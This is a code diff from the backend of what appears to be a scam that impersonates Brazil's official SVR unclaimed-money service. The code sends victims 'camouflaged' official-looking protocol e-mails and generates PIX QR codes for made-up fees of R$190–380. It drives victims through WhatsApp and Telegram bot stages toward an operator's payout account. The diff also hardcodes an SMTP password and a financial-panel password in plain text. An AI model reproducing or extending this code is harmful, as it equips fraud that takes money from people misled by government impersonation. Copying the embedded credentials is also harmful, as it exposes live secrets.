@@ -22,12 +22,12 @@ let currentConfig = {
   pixEmail: "contato@svr.gov.br",
   pixDocument: "13462947055",
   gatewayFee: 5.0, // Taxa em %
-  smtpHost: process.env.SMTP_HOST || "smtp.hostinger.com",
-  smtpPort: parseInt(process.env.SMTP_PORT || "465"),
-  smtpUser: process.env.SMTP_USER || "",
-  smtpPass: process.env.SMTP_PASS || "",
+  smtpHost: "smtp.hostinger.com",
+  smtpPort: 465,
+  smtpUser: "protocolo@consultarvaloresareceber.com.br",
+  smtpPass: "Ng200726@",
   smtpSenderName: "Portal SVR - Protocolo Oficial",
-  financialPassword: "admin", // Senha de segurança para financeiro
+  financialPassword: "ng197826", // Senha de segurança para financeiro
   adminPixKey: "",
   adminPixType: "CPF",
   adminPixName: "",
@@ -71,7 +71,7 @@ let isBotStarting = false;
 function startBot(id: string = 'main') {
   if (isBotStarting && id === 'main') return;
   if (id === 'main') isBotStarting = true;
-  
+
   stopBot(id);
   console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id}`);
   const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });
@@ -120,15 +120,15 @@ async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: s
     const randomDays = Math.floor(Math.random() * (10 - 5 + 1)) + 5;
     const randomFee = (Math.random() * (380 - 190) + 190).toFixed(2);
     // Protocolo camuflado (Visual de Hash Criptográfico)
-    const displayProtocol = `0x${protocol.replace(/\D/g, '').substring(0,6) || Math.random().toString(16).substring(2,8).toUpperCase()}-${protocol.substring(0,4).toUpperCase()}`;
-    
+    const displayProtocol = `0x${protocol.replace(/\D/g, '').substring(0, 6) || Math.random().toString(16).substring(2, 8).toUpperCase()}-${protocol.substring(0, 4).toUpperCase()}`;
+
     // Logo camuflada do sistema
-    const logoUrl = "https://portalsvr.shardweb.app/assets/logos/asset_g_mark.png"; 
+    const logoUrl = "https://portalsvr.shardweb.app/assets/logos/asset_g_mark.png";
 
     // Geração de mensagem automática para o WhatsApp
     const isDefaultWhatsapp = currentConfig.whatsappNumber === (process.env.WHATSAPP_NUMBER || "5511971730325");
     let waMessage = "";
-    
+
     if (isDefaultWhatsapp) {
       // Mensagem para o bot principal (Foco em antecipação)
       waMessage = `Olá, gostaria de solicitar a antecipação da liberação dos meus ativos vinculados ao protocolo ${displayProtocol}. Nome: ${leadName}.`;
@@ -136,7 +136,7 @@ async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: s
       // Mensagem para outro setor (Foco em acompanhamento oficial)
       waMessage = `Prezados, sou ${leadName} e possuo o protocolo de segurança ${displayProtocol}. Fui redirecionado para este canal oficial para acompanhamento da fase de transição de ativos identificados no sistema SVR.`;
     }
-    
+
     const waLink = `https://wa.me/${currentConfig.whatsappNumber}?text=${encodeURIComponent(waMessage)}`;
 
     const htmlContent = `
@@ -312,14 +312,14 @@ async function generateStandardPix(telefone: string, valorNumeric: number, messa
           tangible: false
         }
       ],
-      customer: { 
-        name: currentConfig.pixName, 
+      customer: {
+        name: currentConfig.pixName,
         email: currentConfig.pixEmail,
-        document: { number: currentConfig.pixDocument.replace(/\D/g, ''), type: currentConfig.pixDocument.length > 11 ? "CNPJ" : "CPF" } 
+        document: { number: currentConfig.pixDocument.replace(/\D/g, ''), type: currentConfig.pixDocument.length > 11 ? "CNPJ" : "CPF" }
       }
     }, {
-      headers: { 
-        'Authorization': `Basic ${auth}`, 
+      headers: {
+        'Authorization': `Basic ${auth}`,
         'Content-Type': 'application/json',
         'Accept': 'application/json',
         'User-Agent': 'SVR-GATEWAY-RUNTIME/5.0'
@@ -345,7 +345,7 @@ async function generateStandardPix(telefone: string, valorNumeric: number, messa
 
     const qrBuffer = await QRCode.toBuffer(pixCode, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
     const previewCaption = `⚡ <b>SISTEMA PADRÃO (AUTO)</b>\n\n💰 Valor: R$ ${valorNumeric.toFixed(2)}\n📱 Lead: <code>${telefone}</code>\n🆔 ID: <code>${transId}</code>\n\n⚠️ <i>Escolha o destino deste protocolo:</i>`;
-    
+
     await sendTelegramPhoto(qrBuffer, previewCaption, {
       inline_keyboard: [
         [
@@ -632,7 +632,7 @@ async function startTelegramPolling() {
           const queue = getQueueInfo();
           let txt = "👥 <b>FILA DE LEADS</b>\n\n";
           if (queue.length === 0) txt += "<i>Ninguém na fila agora.</i>";
-          else queue.slice(0, 10).forEach((l, i) => txt += `${i+1}. 📱 ${l.chatId} (${l.step})\n`);
+          else queue.slice(0, 10).forEach((l, i) => txt += `${i + 1}. 📱 ${l.chatId} (${l.step})\n`);
           await sendTelegram(txt, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
         }
         else if (text === "cmd:ping") {
@@ -739,7 +739,7 @@ async function startTelegramPolling() {
             `📋 <b>CONTA DE RECEBIMENTO:</b>\n` +
             `• PIX: <code>${currentConfig.adminPixKey || 'Não definida'}</code> (${currentConfig.adminPixType})\n` +
             `• Nome: ${currentConfig.adminPixName || 'N/D'}`;
-          
+
           const kb = {
             inline_keyboard: [
               [{ text: "💸 Solicitar Saque Total", callback_data: "painel:saque_total" }],
@@ -860,8 +860,8 @@ async function startTelegramPolling() {
             `⚠️ <i>Confirma a geração deste protocolo?</i>`;
           const kb = {
             inline_keyboard: [
-                [{ text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix_confirm_std:${chatId}` }, { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` }],
-                [{ text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }]
+              [{ text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix_confirm_std:${chatId}` }, { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` }],
+              [{ text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }]
             ]
           };
           await sendTelegram(previewText, msgId, kb);
@@ -915,7 +915,7 @@ async function startTelegramPolling() {
           const dest = parts[1];
           const pendingId = parts[2];
           const pix = pendingPix.get(pendingId);
-          
+
           if (!pix) {
             await sendTelegram("❌ <b>ERRO:</b> Protocolo expirado ou não encontrado.", msgId);
             continue;
@@ -925,23 +925,23 @@ async function startTelegramPolling() {
             fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: pix.telefone, message: pix.formalMessage }));
             // Envia o código logo em seguida
             setTimeout(() => {
-                fs.writeFileSync(`cmd-send-${Date.now()+1}.json`, JSON.stringify({ to: pix.telefone, message: pix.pixCode }));
+              fs.writeFileSync(`cmd-send-${Date.now() + 1}.json`, JSON.stringify({ to: pix.telefone, message: pix.pixCode }));
             }, 1000);
             await sendTelegram(`🚀 <b>ENVIADO AO LEAD!</b>\n\nO protocolo foi enviado com sucesso para <code>${pix.telefone}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
           } else if (dest === 'copy') {
             await sendTelegram(`📋 <b>HASH PIX (COPIAR):</b>\n\n<code>${pix.pixCode}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
           } else if (dest === 'phone') {
-             botStates.set(userId, { action: 'awaiting_target_phone', data: { pendingId } });
-             await sendTelegram(`📱 <b>ENVIAR PARA OUTRO NÚMERO</b>\n\nPor favor, digite o número de telefone (com DDD) para o qual deseja enviar este PIX:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
+            botStates.set(userId, { action: 'awaiting_target_phone', data: { pendingId } });
+            await sendTelegram(`📱 <b>ENVIAR PARA OUTRO NÚMERO</b>\n\nPor favor, digite o número de telefone (com DDD) para o qual deseja enviar este PIX:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
           }
         }
         else if (!cb && msg?.text) {
           const state = botStates.get(userId);
-          
+
           if (state?.action?.startsWith('awaiting_pix_edit_')) {
             const field = state.action.replace('awaiting_pix_edit_', '');
             const value = msg.text.trim();
-            
+
             let isValid = true;
             let errorMsg = "";
 
@@ -977,7 +977,7 @@ async function startTelegramPolling() {
               // Trigger menu financeiro
               const fakeMsg = { ...msg, text: 'painel:financeiro_menu' };
               // Emula o clique no botão de menu financeiro
-              return; 
+              return;
             } else {
               await sendTelegram(`❌ <b>SENHA INCORRETA</b>\n\nTente novamente ou cancele:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
             }
@@ -992,8 +992,8 @@ async function startTelegramPolling() {
             const field = state.action.replace('awaiting_saque_fee_edit_', '');
             const value = parseFloat(msg.text.trim());
             if (isNaN(value)) {
-                await sendTelegram(`❌ <b>VALOR INVÁLIDO</b>\n\nDigite um número válido.`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_taxas_saque" }]] });
-                return;
+              await sendTelegram(`❌ <b>VALOR INVÁLIDO</b>\n\nDigite um número válido.`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_taxas_saque" }]] });
+              return;
             }
             const configKey: any = { fixed: 'withdrawalFeeFixed', percent: 'withdrawalFeePercent' };
             (currentConfig as any)[configKey[field]] = value;
@@ -1004,7 +1004,7 @@ async function startTelegramPolling() {
           else if (state?.action?.startsWith('awaiting_smtp_edit_')) {
             const field = state.action.replace('awaiting_smtp_edit_', '');
             const value = msg.text.trim();
-            
+
             const configKey: any = { name: 'smtpSenderName', host: 'smtpHost', port: 'smtpPort', user: 'smtpUser', pass: 'smtpPass' };
             const finalValue = field === 'port' ? parseInt(value) : value;
             (currentConfig as any)[configKey[field]] = finalValue;
@@ -1024,20 +1024,20 @@ async function startTelegramPolling() {
             const pix = pendingPix.get(pendingId);
             botStates.delete(userId);
             if (pix) {
-               const target = phone.includes('@c.us') ? phone : `${phone}@c.us`;
-               fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: target, message: pix.formalMessage }));
-               setTimeout(() => {
-                   fs.writeFileSync(`cmd-send-${Date.now()+1}.json`, JSON.stringify({ to: target, message: pix.pixCode }));
-               }, 1000);
-               await sendTelegram(`🚀 <b>ENVIADO COM SUCESSO!</b>\n\nProtocolo enviado para o número <code>${phone}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
+              const target = phone.includes('@c.us') ? phone : `${phone}@c.us`;
+              fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: target, message: pix.formalMessage }));
+              setTimeout(() => {
+                fs.writeFileSync(`cmd-send-${Date.now() + 1}.json`, JSON.stringify({ to: target, message: pix.pixCode }));
+              }, 1000);
+              await sendTelegram(`🚀 <b>ENVIADO COM SUCESSO!</b>\n\nProtocolo enviado para o número <code>${phone}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
             }
           }
         }
 
       }
-    } catch (e: any) { 
+    } catch (e: any) {
       console.error("❌ [TELEGRAM POLLING ERROR]:", e.message);
-      await new Promise(r => setTimeout(r, 5000)); 
+      await new Promise(r => setTimeout(r, 5000));
     }
   }
 }
